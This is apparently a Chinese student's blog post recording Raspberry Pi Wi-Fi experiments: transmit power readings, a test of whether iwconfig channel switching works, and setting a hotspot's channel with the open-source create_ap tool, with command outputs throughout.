    10.34 mW       的无线发射功率为  10 dBm
    8.26  mW       的无线发射功率为  9  dBm
    6.25  mW       的无线发射功率为  8  dBm
    3.125 mW       的无线发射功率为  5  dBm
    1     mW       的无线发射功率为  0  dBm
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>经测试树莓派的发射功率最大可以达到31dBm、linux电脑可以达到20dBm。<br>树莓派可以通过命令行切换信道，linux电脑无法切换信道。<br>和学长讨论后不知道是不是伪切换信道需要进行测试。</p>
<h2 id="测试是否为伪切换"><a href="#测试是否为伪切换" class="headerlink" title="测试是否为伪切换"></a>测试是否为伪切换</h2><p>让树莓派连接到一个固定信道的路由器进行测试。</p>
<ol>
<li><p>若无法切换信道则可以推断，树莓派确实能够切换上行信道</p>
</li>
<li><p>若可以切换信道，且可以上传则证明树莓派伪切换信道</p>
</li>
</ol>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><pre><code>准备一个路由器，将信道调整为固定信道1，树莓派尝试进行连接(修改配置文件)。
</code></pre><h3 id="测试是否连接到固定信道路由器"><a href="#测试是否连接到固定信道路由器" class="headerlink" title="测试是否连接到固定信道路由器"></a>测试是否连接到固定信道路由器</h3><pre class="line-numbers language-none"><code class="language-none">iwconfig
wlan0     IEEE 802.11bgn  ESSID:&quot;CH1&quot;
          Mode:Managed  Frequency:2.412 GHz  Access Point: C8:3A:35:58:A4:D8
          Bit Rate&#x3D;72.2 Mb&#x2F;s   Tx-Power&#x3D;31 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality&#x3D;70&#x2F;70  Signal level&#x3D;-38 dBm
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:5  Invalid misc:0   Missed beacon:0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">ping 192.168.2.100
PING 192.168.2.100 (192.168.2.100) 56(84) bytes of data.
64 bytes from 192.168.2.100: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;641 ms
64 bytes from 192.168.2.100: icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;143 ms
64 bytes from 192.168.2.100: icmp_seq&#x3D;3 ttl&#x3D;64 time&#x3D;64.2 ms
64 bytes from 192.168.2.100: icmp_seq&#x3D;4 ttl&#x3D;64 time&#x3D;84.8 ms
64 bytes from 192.168.2.100: icmp_seq&#x3D;5 ttl&#x3D;64 time&#x3D;214 ms
64 bytes from 192.168.2.100: icmp_seq&#x3D;6 ttl&#x3D;64 time&#x3D;141 ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结论:以上测试证明树莓派有正确连接到路由器</p>
<h3 id="测试树莓派是否能切换信道"><a href="#测试树莓派是否能切换信道" class="headerlink" title="测试树莓派是否能切换信道"></a>测试树莓派是否能切换信道</h3><ol>
<li><code>iwlist channel</code>显示：<pre class="line-numbers language-none"><code class="language-none">wlan0     11 channels in total; available frequencies :
          Channel 01 : 2.412 GHz
          Channel 02 : 2.417 GHz
          Channel 03 : 2.422 GHz
          Channel 04 : 2.427 GHz
          Channel 05 : 2.432 GHz
          Channel 06 : 2.437 GHz
          Channel 07 : 2.442 GHz
          Channel 08 : 2.447 GHz
          Channel 09 : 2.452 GHz
          Channel 10 : 2.457 GHz
          Channel 11 : 2.462 GHz
          Current Frequency:2.412 GHz (Channel 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<p>2.切换信道</p>
<p> <code>sudo iwconfig wlan0 channel 3</code></p>
<pre class="line-numbers language-none"><code class="language-none">iwconfig
wlan0     IEEE 802.11bgn  ESSID:&quot;CH1&quot;
          Mode:Managed  Frequency:2.422 GHz  Access Point: Not-Associated
          Tx-Power&#x3D;31 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>信道被修改了</p>
<p>尝试进行ping<br><pre class="line-numbers language-none"><code class="language-none">ping 192.168.2.109
PING 192.168.2.109 (192.168.2.109) 56(84) bytes of data.
64 bytes from 192.168.2.109: icmp_seq&#x3D;1 ttl&#x3D;128 time&#x3D;9.72 ms
64 bytes from 192.168.2.109: icmp_seq&#x3D;2 ttl&#x3D;128 time&#x3D;6.33 ms
64 bytes from 192.168.2.109: icmp_seq&#x3D;3 ttl&#x3D;128 time&#x3D;22.0 ms
64 bytes from 192.168.2.109: icmp_seq&#x3D;4 ttl&#x3D;128 time&#x3D;44.1 ms
64 bytes from 192.168.2.109: icmp_seq&#x3D;5 ttl&#x3D;128 time&#x3D;8.24 ms
64 bytes from 192.168.2.109: icmp_seq&#x3D;6 ttl&#x3D;128 time&#x3D;7.62 ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>传输正常…</p>
<p>结论:树莓派很有可能是伪切换上行信道，但是我没有办法排除固定信道路由器无法接受非该信道信号的这个可能性。</p>
<h2 id="进一步实验"><a href="#进一步实验" class="headerlink" title="进一步实验"></a>进一步实验</h2><p>如果修改信道可能xmu201_1的信道会改变。</p>
<pre class="line-numbers language-none"><code class="language-none">iwlist scan
Cell 05 - Address: D4:EE:07:49:19:FC
                    Channel:3
                    Frequency:2.422 GHz (Channel 3)
                    Quality&#x3D;70&#x2F;70  Signal level&#x3D;-39 dBm
                    Encryption key:on
                    ESSID:&quot;xmu201_1&quot;
                    Bit Rates:1 Mb&#x2F;s; 2 Mb&#x2F;s; 5.5 Mb&#x2F;s; 11 Mb&#x2F;s; 9 Mb&#x2F;s
                              18 Mb&#x2F;s; 36 Mb&#x2F;s; 54 Mb&#x2F;s
                    Bit Rates:6 Mb&#x2F;s; 12 Mb&#x2F;s; 24 Mb&#x2F;s; 48 Mb&#x2F;s
                    Mode:Master
                    Extra:tsf&#x3D;0000000000000000
                    Extra: Last beacon: 27270ms ago
                    IE: Unknown: 0008786D753230315F31
                    IE: Unknown: 010882848B961224486C
                    IE: Unknown: 030103
                    IE: Unknown: 32040C183060
                    IE: Unknown: 0706434E20010D14
                    IE: Unknown: 33082001020304050607
                    IE: Unknown: 33082105060708090A0B
                    IE: Unknown: 050400010000
                    IE: WPA Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: IEEE 802.11i&#x2F;WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 2A0106
                    IE: Unknown: 2D1AAC0117FFFF000000000000000000000000000000000000000000
                    IE: Unknown: 3D1603000400000000000000000000000000000000000000
                    IE: Unknown: DD180050F2020101000003A4000027A4000042435E0062322F00
                    IE: Unknown: 0B0502000B127A
                    IE: Unknown: DD07000C4300000000
                    IE: Unknown: DD06D4EE07010100
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>进行测试</p>
<p> <code>sudo iwconfig wlan0 channel 3</code></p>
<pre class="line-numbers language-none"><code class="language-none">iwconfig
wlan0     IEEE 802.11bgn  ESSID:&quot;CH1&quot;
          Mode:Managed  Frequency:2.422 GHz  Access Point: Not-Associated
          Tx-Power&#x3D;31 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>重新进行信道扫描</p>
<pre class="line-numbers language-none"><code class="language-none">iwlist scan
Cell 05 - Address: D4:EE:07:49:19:FC
                    Channel:3
                    Frequency:2.422 GHz (Channel 3)
                    Quality&#x3D;70&#x2F;70  Signal level&#x3D;-39 dBm
                    Encryption key:on
                    ESSID:&quot;xmu201_1&quot;
                    Bit Rates:1 Mb&#x2F;s; 2 Mb&#x2F;s; 5.5 Mb&#x2F;s; 11 Mb&#x2F;s; 9 Mb&#x2F;s
                              18 Mb&#x2F;s; 36 Mb&#x2F;s; 54 Mb&#x2F;s
                    Bit Rates:6 Mb&#x2F;s; 12 Mb&#x2F;s; 24 Mb&#x2F;s; 48 Mb&#x2F;s
                    Mode:Master
                    Extra:tsf&#x3D;0000000000000000
                    Extra: Last beacon: 27270ms ago
                    IE: Unknown: 0008786D753230315F31
                    IE: Unknown: 010882848B961224486C
                    IE: Unknown: 030103
                    IE: Unknown: 32040C183060
                    IE: Unknown: 0706434E20010D14
                    IE: Unknown: 33082001020304050607
                    IE: Unknown: 33082105060708090A0B
                    IE: Unknown: 050400010000
                    IE: WPA Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: IEEE 802.11i&#x2F;WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 2A0106
                    IE: Unknown: 2D1AAC0117FFFF000000000000000000000000000000000000000000
                    IE: Unknown: 3D1603000400000000000000000000000000000000000000
                    IE: Unknown: DD180050F2020101000003A4000027A4000042435E0062322F00
                    IE: Unknown: 0B0502000B127A
                    IE: Unknown: DD07000C4300000000
                    IE: Unknown: DD06D4EE07010100
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>信道没有发生变化。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>树莓派的 <code>sudo iwconfig wlan0 channel 3</code>极有可能是伪修改：即树莓派修改了某个寄存器的数值，但是并没有实际修改信道，这个可以通过进一步的研究进行验证。</p>
<h2 id="树莓派开启热点功能"><a href="#树莓派开启热点功能" class="headerlink" title="树莓派开启热点功能"></a>树莓派开启热点功能</h2><p>研究了一下树莓派的开启热点方法，都有点不科学，最后找到一个比较稳定且合适的方法，需要使用HDMI线和鼠标键盘(因为断掉wifi后树莓派会和电脑断连接、若有插网线则可以无视)具体操作如下：</p>
<p>创建WiFi热点使用的GitHub上一个开源项目：<br><a href="https://github.com/oblique/create_ap">https://github.com/oblique/create_ap</a></p>
<h3 id="下载开源项目包"><a href="#下载开源项目包" class="headerlink" title="下载开源项目包"></a>下载开源项目包</h3><pre class="line-numbers language-none"><code class="language-none">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;oblique&#x2F;create_ap
cd create_ap
sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>可能会存在说树莓派连接不上github的可能性(ps:我就遇到了)</p>
<ul>
<li>参考以下步骤：</li>
</ul>
<ol>
<li>用电脑从github下载zip格式文件</li>
<li>通过xftp将zip文件转存入树莓派</li>
<li>unzip xxx.zip文件<pre class="line-numbers language-none"><code class="language-none">cd create_ap
sudo make install <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
</ol>
<h3 id="运用该开源项目"><a href="#运用该开源项目" class="headerlink" title="运用该开源项目"></a>运用该开源项目</h3><ul>
<li><a href="https://github.com/oblique/create_ap">参考</a></li>
</ul>
<h3 id="No-passphrase-open-network"><a href="#No-passphrase-open-network" class="headerlink" title="No passphrase (open network):"></a>No passphrase (open network):</h3><pre><code>create_ap wlan0 eth0 MyAccessPoint
</code></pre><h3 id="WPA-WPA2-passphrase"><a href="#WPA-WPA2-passphrase" class="headerlink" title="WPA + WPA2 passphrase:"></a>WPA + WPA2 passphrase:</h3><pre><code>create_ap wlan0 eth0 MyAccessPoint MyPassPhrase
</code></pre><h3 id="AP-without-Internet-sharing"><a href="#AP-without-Internet-sharing" class="headerlink" title="AP without Internet sharing:"></a>AP without Internet sharing:</h3><pre><code>create_ap -n wlan0 MyAccessPoint MyPassPhrase
</code></pre><h3 id="Bridged-Internet-sharing"><a href="#Bridged-Internet-sharing" class="headerlink" title="Bridged Internet sharing:"></a>Bridged Internet sharing:</h3><pre><code>create_ap -m bridge wlan0 eth0 MyAccessPoint MyPassPhrase
</code></pre><h3 id="Bridged-Internet-sharing-pre-configured-bridge-interface"><a href="#Bridged-Internet-sharing-pre-configured-bridge-interface" class="headerlink" title="Bridged Internet sharing (pre-configured bridge interface):"></a>Bridged Internet sharing (pre-configured bridge interface):</h3><pre><code>create_ap -m bridge wlan0 br0 MyAccessPoint MyPassPhrase
</code></pre><h3 id="Internet-sharing-from-the-same-WiFi-interface"><a href="#Internet-sharing-from-the-same-WiFi-interface" class="headerlink" title="Internet sharing from the same WiFi interface:"></a>Internet sharing from the same WiFi interface:</h3><pre><code>create_ap wlan0 wlan0 MyAccessPoint MyPassPhrase
</code></pre><h3 id="Choose-a-different-WiFi-adapter-driver"><a href="#Choose-a-different-WiFi-adapter-driver" class="headerlink" title="Choose a different WiFi adapter driver"></a>Choose a different WiFi adapter driver</h3><pre><code>create_ap --driver rtl871xdrv wlan0 eth0 MyAccessPoint MyPassPhrase
</code></pre><h3 id="No-passphrase-open-network-using-pipe"><a href="#No-passphrase-open-network-using-pipe" class="headerlink" title="No passphrase (open network) using pipe:"></a>No passphrase (open network) using pipe:</h3><pre><code>echo -e &quot;MyAccessPoint&quot; | create_ap wlan0 eth0
</code></pre><h3 id="WPA-WPA2-passphrase-using-pipe"><a href="#WPA-WPA2-passphrase-using-pipe" class="headerlink" title="WPA + WPA2 passphrase using pipe:"></a>WPA + WPA2 passphrase using pipe:</h3><pre><code>echo -e &quot;MyAccessPoint\nMyPassPhrase&quot; | create_ap wlan0 eth0
</code></pre><h3 id="Enable-IEEE-802-11n"><a href="#Enable-IEEE-802-11n" class="headerlink" title="Enable IEEE 802.11n"></a>Enable IEEE 802.11n</h3><pre><code>create_ap --ieee80211n --ht_capab &#39;[HT40+]&#39; wlan0 eth0 MyAccessPoint MyPassPhrase
</code></pre><h3 id="Client-Isolation"><a href="#Client-Isolation" class="headerlink" title="Client Isolation:"></a>Client Isolation:</h3><pre><code>create_ap --isolate-clients wlan0 eth0 MyAccessPoint MyPassPhrase
</code></pre><h2 id="Systemd-service"><a href="#Systemd-service" class="headerlink" title="Systemd service"></a>Systemd service</h2><p>Using the persistent <a href="https://wiki.archlinux.org/index.php/systemd#Basic_systemctl_usage">systemd</a> service</p>
<h3 id="Start-service-immediately"><a href="#Start-service-immediately" class="headerlink" title="Start service immediately:"></a>Start service immediately:</h3><pre><code>systemctl start create_ap
</code></pre><h3 id="Start-on-boot"><a href="#Start-on-boot" class="headerlink" title="Start on boot:"></a>Start on boot:</h3><pre><code>systemctl enable create_ap
</code></pre><h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>FreeBSD</p>
<h2 id="个人热点尝试的操作"><a href="#个人热点尝试的操作" class="headerlink" title="个人热点尝试的操作"></a>个人热点尝试的操作</h2><h3 id="根据原开源项目内容设置自己需要的wifi"><a href="#根据原开源项目内容设置自己需要的wifi" class="headerlink" title="根据原开源项目内容设置自己需要的wifi"></a>根据原开源项目内容设置自己需要的wifi</h3><ol>
<li>创建一个没有输入网络的热点</li>
</ol>
<p><code>sudo create_ap -n wlan0 pi_wifi MyPassWord</code></p>
<ol>
<li>遇到错误</li>
</ol>
<p><code>ERROR: Your adapter can not be a station (i.e. be connected) and an AP at the same time</code></p>
<p>分析：应该是目前网络正在连接wifi，需要断开，turn off wifi ，重新进行尝试。</p>
<ol>
<li>重新<code>sudo create_ap -n wlan0 pi_wifi MyPassWord</code></li>
</ol>
<p>报错：RTNETLINK answers: Operation not possible due to RF-kill</p>
<p>分析:应该是因为wifi被我之间断开，不能之间关闭只需要断开连接就行了</p>
<ol>
<li>test：</li>
</ol>
<p>这时用<code>rfkill list</code>查看所有无线设备</p>
<pre class="line-numbers language-none"><code class="language-none">0: phy0: Wireless LAN
   Soft blocked: yes
   Hard blocked: no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>发现wlan0软件关闭了。</p>
<p>运行命令<code>rfkill unblock wlan</code>再查看无线设备</p>
<pre class="line-numbers language-none"><code class="language-none">0: phy0: Wireless LAN
    Soft blocked: no
    Hard blocked: no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>wlan0软件开启。</p>
<ol>
<li>再运行上面的<code>sudo create_ap -n wlan0 pi_wifi MyPassWord</code>出现：</li>
</ol>
<p><code>wlan0: AP-ENABLED</code></p>
<p>成功开启热点</p>
<h1 id="设置wifi的信道"><a href="#设置wifi的信道" class="headerlink" title="设置wifi的信道"></a>设置wifi的信道</h1><h2 id="但是不要忘记了我们的目的，查了很久都没有人修改过热点的信道！！！可能大家不需要该热点的信道，但是作为搞无线网络通信的，我们不能只追求这个，我们要改信道！"><a href="#但是不要忘记了我们的目的，查了很久都没有人修改过热点的信道！！！可能大家不需要该热点的信道，但是作为搞无线网络通信的，我们不能只追求这个，我们要改信道！" class="headerlink" title="但是不要忘记了我们的目的，查了很久都没有人修改过热点的信道！！！可能大家不需要该热点的信道，但是作为搞无线网络通信的，我们不能只追求这个，我们要改信道！"></a>但是不要忘记了我们的目的，查了很久都没有人修改过热点的信道！！！可能大家不需要该热点的信道，但是作为搞无线网络通信的，我们不能只追求这个，我们要改信道！</h2><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol>
<li><p>方法1：使用命令行修改通信信道 <code>sudo iwconfig wlan0 channel 3</code></p>
</li>
<li><p>方法2：查看该开源项目的内部文件，找到设置信道的方法</p>
</li>
<li><p>方法3：更换其他方式设置热点的信道</p>
</li>
</ol>
<h2 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h2><h3 id="命令行修改信道"><a href="#命令行修改信道" class="headerlink" title="命令行修改信道"></a>命令行修改信道</h3><ol>
<li><code>sudo iwconfig wlan0 channel 3</code></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Error for wireless request &quot;Set Frequency&quot; (8B04) :
    SET failed on device wlan0 ; Operation not supported.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>直接报错，无法修改信道。</p>
<ol>
<li><code>iwconfig</code></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">wlan0     IEEE 802.11bgn  Mode:Master  Tx-Power&#x3D;20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off

lo        no wireless extensions.

eth0      no wireless extensions.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这说明什么，命令行在ap状态下是无效的，没办法直接这样修改，该方案不可行。</p>
<h3 id="查看该开源项目的内部文件"><a href="#查看该开源项目的内部文件" class="headerlink" title="查看该开源项目的内部文件"></a>查看该开源项目的内部文件</h3><p>这个热点开源项目一共有以下文件<br><pre class="line-numbers language-none"><code class="language-none">bash_completion  create_ap.conf    create_ap.service  LICENSE   README.md
create_ap        create_ap.openrc  howto              Makefile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>于是一个一个的找（只花了几分钟而已哈哈）</p>
<h3 id="项目源代码"><a href="#项目源代码" class="headerlink" title="项目源代码"></a>项目源代码</h3><pre class="line-numbers language-none"><code class="language-none">usage() &#123;
    echo &quot;Usage: &quot;$PROGNAME&quot; [options] &lt;wifi-interface&gt; [&lt;interface-with-internet&gt;] [&lt;access-point-name&gt; [&lt;passphrase&gt;]]&quot;
    echo
    echo &quot;Options:&quot;
    echo &quot;  -h, --help              Show this help&quot;
    echo &quot;  --version               Print version number&quot;
    echo &quot;  -c &lt;channel&gt;            Channel number (default: 1)&quot;
    echo &quot;  -w &lt;WPA version&gt;        Use 1 for WPA, use 2 for WPA2, use 1+2 for both (default: 1+2)&quot;
    echo &quot;  -n                      Disable Internet sharing (if you use this, don&#39;t pass&quot;
    echo &quot;                          the &lt;interface-with-internet&gt; argument)&quot;
    echo &quot;  -m &lt;method&gt;             Method for Internet sharing.&quot;
    echo &quot;                          Use: &#39;nat&#39; for NAT (default)&quot;
    echo &quot;                               &#39;bridge&#39; for bridging&quot;
    echo &quot;                               &#39;none&#39; for no Internet sharing (equivalent to -n)&quot;
    echo &quot;  --psk                   Use 64 hex digits pre-shared-key instead of passphrase&quot;
    echo &quot;  --hidden                Make the Access Point hidden (do not broadcast the SSID)&quot;
    echo &quot;  --mac-filter            Enable MAC address filtering&quot;
    echo &quot;  --mac-filter-accept     Location of MAC address filter list (defaults to &#x2F;etc&#x2F;hostapd&#x2F;hostapd.accept)&quot;
    echo &quot;  --redirect-to-localhost If -n is set, redirect every web request to localhost (useful for public information networks)&quot;
    echo &quot;  --hostapd-debug &lt;level&gt; With level between 1 and 2, passes arguments -d or -dd to hostapd for debugging.&quot;
    echo &quot;  --isolate-clients       Disable communication between clients&quot;
    echo &quot;  --ieee80211n            Enable IEEE 802.11n (HT)&quot;
    echo &quot;  --ieee80211ac           Enable IEEE 802.11ac (VHT)&quot;
    echo &quot;  --ht_capab &lt;HT&gt;         HT capabilities (default: [HT40+])&quot;
    echo &quot;  --vht_capab &lt;VHT&gt;       VHT capabilities&quot;
    echo &quot;  --country &lt;code&gt;        Set two-letter country code for regularity (example: US)&quot;
    echo &quot;  --freq-band &lt;GHz&gt;       Set frequency band. Valid inputs: 2.4, 5 (default: 2.4)&quot;
    echo &quot;  --driver                Choose your WiFi adapter driver (default: nl80211)&quot;
    echo &quot;  --no-virt               Do not create virtual interface&quot;
    echo &quot;  --no-haveged            Do not run &#39;haveged&#39; automatically when needed&quot;
    echo &quot;  --fix-unmanaged         If NetworkManager shows your interface as unmanaged after you&quot;
    echo &quot;                          close create_ap, then use this option to switch your interface&quot;
    echo &quot;                          back to managed&quot;
    echo &quot;  --mac &lt;MAC&gt;             Set MAC address&quot;
    echo &quot;  --dhcp-dns &lt;IP1[,IP2]&gt;  Set DNS returned by DHCP&quot;
    echo &quot;  --daemon                Run create_ap in the background&quot;
    echo &quot;  --pidfile &lt;pidfile&gt;     Save daemon PID to file&quot;
    echo &quot;  --logfile &lt;logfile&gt;     Save daemon messages to file&quot;
    echo &quot;  --stop &lt;id&gt;             Send stop command to an already running create_ap. For an &lt;id&gt;&quot;
    echo &quot;                          you can put the PID of create_ap or the WiFi interface. You can&quot;
    echo &quot;                          get them with --list-running&quot;
    echo &quot;  --list-running          Show the create_ap processes that are already running&quot;
    echo &quot;  --list-clients &lt;id&gt;     List the clients connected to create_ap instance associated with &lt;id&gt;.&quot;
    echo &quot;                          For an &lt;id&gt; you can put the PID of create_ap or the WiFi interface.&quot;
    echo &quot;                          If virtual WiFi interface was created, then use that one.&quot;
    echo &quot;                          You can get them with --list-running&quot;
    echo &quot;  --mkconfig &lt;conf_file&gt;  Store configs in conf_file&quot;
    echo &quot;  --config &lt;conf_file&gt;    Load configs from conf_file&quot;
    echo
    echo &quot;Non-Bridging Options:&quot;
    echo &quot;  --no-dns                Disable dnsmasq DNS server&quot;
    echo &quot;  --no-dnsmasq            Disable dnsmasq server completely&quot;
    echo &quot;  -g &lt;gateway&gt;            IPv4 Gateway for the Access Point (default: 192.168.12.1)&quot;
    echo &quot;  -d                      DNS server will take into account &#x2F;etc&#x2F;hosts&quot;
    echo &quot;  -e &lt;hosts_file&gt;         DNS server will take into account additional hosts file&quot;
    echo
    echo &quot;Useful informations:&quot;
    echo &quot;  * If you&#39;re not using the --no-virt option, then you can create an AP with the same&quot;
    echo &quot;    interface you are getting your Internet connection.&quot;
    echo &quot;  * You can pass your SSID and password through pipe or through arguments (see examples).&quot;
    echo &quot;  * On bridge method if the &lt;interface-with-internet&gt; is not a bridge interface, then&quot;
    echo &quot;    a bridge interface is created automatically.&quot;
    echo
    echo &quot;Examples:&quot;
    echo &quot;  &quot;$PROGNAME&quot; wlan0 eth0 MyAccessPoint MyPassPhrase&quot;
    echo &quot;  echo -e &#39;MyAccessPoint\nMyPassPhrase&#39; | &quot;$PROGNAME&quot; wlan0 eth0&quot;
    echo &quot;  &quot;$PROGNAME&quot; wlan0 eth0 MyAccessPoint&quot;
    echo &quot;  echo &#39;MyAccessPoint&#39; | &quot;$PROGNAME&quot; wlan0 eth0&quot;
    echo &quot;  &quot;$PROGNAME&quot; wlan0 wlan0 MyAccessPoint MyPassPhrase&quot;
    echo &quot;  &quot;$PROGNAME&quot; -n wlan0 MyAccessPoint MyPassPhrase&quot;
    echo &quot;  &quot;$PROGNAME&quot; -m bridge wlan0 eth0 MyAccessPoint MyPassPhrase&quot;
    echo &quot;  &quot;$PROGNAME&quot; -m bridge wlan0 br0 MyAccessPoint MyPassPhrase&quot;
    echo &quot;  &quot;$PROGNAME&quot; --driver rtl871xdrv wlan0 eth0 MyAccessPoint MyPassPhrase&quot;
    echo &quot;  &quot;$PROGNAME&quot; --daemon wlan0 eth0 MyAccessPoint MyPassPhrase&quot;
    echo &quot;  &quot;$PROGNAME&quot; --stop wlan0&quot;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这一行明显及其关键，一看就是可以利用的代码。</p>
<p>其中：</p>
<p><code>echo &quot;  -c &lt;channel&gt;            Channel number (default: 1)&quot;</code></p>
<p>应该可以通过<code>sudo create_ap -n wlan0 pi_wifi MyPassWord -c 2</code>修改信道数值。</p>
<pre class="line-numbers language-none"><code class="language-none">WARN: brmfmac driver doesn&#39;t work properly with virtual interfaces and
      it can cause kernel panic. For this reason we disallow virtual
      interfaces for your adapter.
      For more info: https:&#x2F;&#x2F;github.com&#x2F;oblique&#x2F;create_ap&#x2F;issues&#x2F;203
WARN: Your adapter does not fully support AP virtual interface, enabling --no-virt
Config dir: &#x2F;tmp&#x2F;create_ap.wlan0.conf.d6khWCUL
PID: 4794<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>wlan0应该是被占用了</p>
<h2 id="修改信道"><a href="#修改信道" class="headerlink" title="修改信道"></a>修改信道</h2><p><code>sudo create_ap --s wlan0</code></p>
<p>通过<code>sudo create_ap -n wlan0 pi_wifi MyPassWord -c 1</code>修改信道数值。</p>
<p>通过其他设备进行测试’iwlist scan’</p>
<p>扫描信道结果：<br><pre class="line-numbers language-none"><code class="language-none">wlan0     Scan completed :
          Cell 01 - Address: 18:64:72:92:EC:81
                    Channel:1
                    Frequency:2.412 GHz (Channel 1)
                    Quality&#x3D;46&#x2F;70  Signal level&#x3D;-64 dBm
                    Encryption key:on
                    ESSID:&quot;pi_wifi&quot;
                    Bit Rates:1 Mb&#x2F;s; 2 Mb&#x2F;s; 5.5 Mb&#x2F;s; 6 Mb&#x2F;s; 9 Mb&#x2F;s
                              11 Mb&#x2F;s; 12 Mb&#x2F;s; 18 Mb&#x2F;s
                    Bit Rates:24 Mb&#x2F;s; 36 Mb&#x2F;s; 48 Mb&#x2F;s; 54 Mb&#x2F;s
                    Mode:Master
                    Extra:tsf&#x3D;0000000000000000
                    Extra: Last beacon: 200ms ago
                    IE: Unknown: 0007656475726F616D
                    IE: Unknown: 010882840B0C12161824
                    IE: Unknown: 030101
                    IE: Unknown: 2A0102
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i&#x2F;WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : 802.1x
                    IE: Unknown: 2D1AED111BFFFFFF0000000000000000000000000000000                                        000000000
                    IE: Unknown: 3D1601000A0000000000000000000000000000000000000                                        0
                    IE: Unknown: 7F080000080000000000
                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E00623                                        22F00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>通过<code>sudo create_ap -n wlan0 pi_wifi MyPassWord -c 11</code>修改信道数值。<br>通过其他设备进行测试’iwlist scan’</p>
<p>扫描信道结果：<br><pre class="line-numbers language-none"><code class="language-none">Cell 12 - Address: 18:64:72:92:EC:81
                    Channel:11
                    Frequency:2.462 GHz (Channel 11)
                    Quality&#x3D;66&#x2F;70  Signal level&#x3D;-44 dBm
                    Encryption key:off
                    ESSID:&quot;pi_wifi&quot;
